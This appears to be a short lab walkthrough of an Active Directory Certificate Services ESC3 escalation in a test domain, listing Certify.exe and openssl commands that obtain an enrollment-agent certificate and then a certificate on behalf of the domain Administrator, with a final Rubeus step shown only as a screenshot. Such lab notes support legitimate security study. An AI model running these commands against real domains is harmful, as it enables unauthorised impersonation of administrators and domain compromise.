##### Enumeration

We found the enrollment agent certificate `ESC3_v2_EnrollmentAgent` with:
```powershell
 .\Certify.exe find /vulnerable
```
![[Pasted image 20230117173754.png]]


And we found user certificate for authentication `ESC3_v2_UserWithAuthorizedSignatures` with :
```powershell
.\Certify.exe find
```
![[Pasted image 20230117173550.png]]

##### Getting the AgentEnrollment Certificate

```powershell
.\Certify.exe request /ca:WIN-8DRJKS8Q1T9.labad.fr\labad-CA /template:ESC3_v2_EnrollmentAgent
```
![[Pasted image 20230117173409.png]]

Convert this pem into pfx:
```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

##### Getting the Auth Certificate

```powershell
.\Certify.exe request /ca:WIN-8DRJKS8Q1T9.labad.fr\labad-CA /template:ESC3_v2_UserWithAuthorizedSignatures /onbehalfof:LABAD\Administrator /enrollcert:..\cert.pfx /enrollcertpw:own
```

![[Pasted image 20230117173129.png]]

Convert this pem into pfx:
```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

##### Using rubeus and foothold with the last obtained certificate

![[Pasted image 20230117174144.png]]
